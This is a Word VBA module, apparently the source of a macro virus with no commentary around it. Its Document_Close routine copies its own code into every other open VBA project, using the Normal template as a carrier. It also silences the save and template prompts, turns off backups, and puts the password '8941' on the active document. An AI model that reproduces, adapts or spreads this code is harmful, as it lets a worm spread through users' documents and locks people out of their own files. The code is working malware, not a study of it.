   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True










   'copy itself to new added documents and add password
   Private Sub Document_Close()
   On Error Resume Next
   Dim i, j As Integer
   Dim k, l As Integer
   j = -1

       For i = 1 To Application.VBE.VBProjects.Count
           If Application.VBE.VBProjects(i).Name = "Normal" Then
               j = i
           End If
           If Not Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Close", 0, 0, 1000, 1000) Then
                 If j > 0 Then
                       If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Close", 0, 0, 1000, 1000) Then
                           k = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Close", vbext_pk_Proc)
                           l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                           Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(k, k + l)
                       Else
                           k = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Close", vbext_pk_Proc)
                           l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                           Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(k, k + l)
                       End If
                   End If
           End If
               Options.AllowFastSave = True
               Options.BackgroundSave = True
               Options.CreateBackup = False
               Options.SavePropertiesPrompt = False
               Options.SaveNormalPrompt = False
               ActiveDocument.Password = "8941"
   '            ActiveDocument.Save

       Next i

   End Sub
